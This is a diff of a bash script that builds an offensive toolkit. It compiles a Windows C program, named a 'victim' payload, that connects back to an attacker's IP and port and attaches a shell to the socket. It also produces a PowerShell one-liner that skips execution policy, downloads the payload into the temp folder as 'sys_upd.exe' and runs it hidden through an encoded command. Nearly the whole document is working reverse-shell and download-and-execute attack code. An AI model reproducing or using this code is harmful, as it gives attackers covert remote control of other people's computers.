@@ -1,9 +1,8 @@
 #!/bin/bash
 
-echo -e "\e[1;32m[*]\e[0m Building Native C Victim (Argument-Ready)..."
+echo -e "\e[1;32m[*]\e[0m Building Native C Victim..."
 
 # 1. Create Native C Source
-# This binary is built once but is totally dynamic via argv
 cat <<EOF > native_victim.c
 #include <winsock2.h>
 #include <windows.h>
@@ -11,24 +10,20 @@ cat <<EOF > native_victim.c
 #pragma comment(lib, "ws2_32")
 
 int main(int argc, char *argv[]) {
-    // Expects: payload.exe <ip> <port>
     if (argc < 3) return 1;
-    
     char *ip = argv[1];
     int port = atoi(argv[2]);
-
     WSADATA wsaData;
     SOCKET s;
     struct sockaddr_in addr;
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
-
     WSAStartup(MAKEWORD(2, 2), &wsaData);
     addr.sin_family = AF_INET;
     addr.sin_port = htons(port);
     addr.sin_addr.s_addr = inet_addr(ip);
 
-    // Phase 1: Handshake
+    // Handshake
     s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
     if (WSAConnect(s, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == 0) {
         send(s, "WINDOWS_SHELL\n", 14, 0);
@@ -36,7 +31,7 @@ int main(int argc, char *argv[]) {
     }
     Sleep(2000); 
 
-    // Phase 2: Shell
+    // Shell
     s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
     if (WSAConnect(s, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == 0) {
         memset(&si, 0, sizeof(si));
@@ -57,30 +52,12 @@ rm native_victim.c
 
 echo -e "\e[1;32m[+]\e[0m Native payload compiled: \e[1;33mpayload.binary\e[0m"
 
-# 3. Create the "Middleman" PowerShell Logic
-# This code is designed to sit inside an EncodedCommand and wait for 3 args
-RAW_LOGIC="param(\$u, \$i, \$p); [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; \$f=\"\$env:TEMP\sys_upd.exe\"; (New-Object Net.WebClient).DownloadFile(\$u, \$f); Start-Process \$f -ArgumentList \"\$i \$p\""
-
-# 4. Encode the Middleman logic
-FINAL_B64=$(echo -n "$RAW_LOGIC" | iconv -t utf16le | base64 -w 0)
-
-# 5. Generate the final windows_client.ps1
-# This script is what the final user actually runs
-cat <<EOF > windows_client.ps1
-param(
-    [string]\$URL,
-    [string]\$IP,
-    [string]\$PORT
-)
-
-if (-not \$URL -or -not \$IP -or -not \$PORT) {
-    Write-Host "Usage: .\windows_client.ps1 <URL> <IP> <PORT>" -ForegroundColor Yellow
-    exit
-}
-
-powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $FINAL_B64 -Args \$URL \$IP \$PORT
+# 3. Create the One-Liner Generator Script
+# This bash script will print the exact string you need to copy-paste.
+cat <<'EOF' > windows_one_liner.txt
+powershell.exe -ExecutionPolicy Bypass -Command "& { $u='URL_HERE'; $i='IP_HERE'; $p='PORT_HERE'; $s=\"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; `$f='`$env:TEMP\sys_upd.exe'; (New-Object Net.WebClient).DownloadFile('$u',`$f); Start-Process `$f -ArgumentList '$i $p' \"; $e=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($s)); powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $e }"
 EOF
 
-echo -e "\e[1;32m[+]\e[0m Success! Deployment script created: \e[1;33mwindows_client.ps1\e[0m"
-echo -e "\e[1;34m[*] Usage on Windows:\e[0m"
-echo -e "    .\windows_client.ps1 \"https://raw.../payload.binary\" 10.0.13.7 4444"
+echo -e "\e[1;32m[+]\e[0m Success! One-liner template saved to: \e[1;33mwindows_one_liner.txt\e[0m"
+echo -e "\n\e[1;34m[*] To use, copy the line below and replace the placeholders:\e[0m"
+cat windows_one_liner.txt
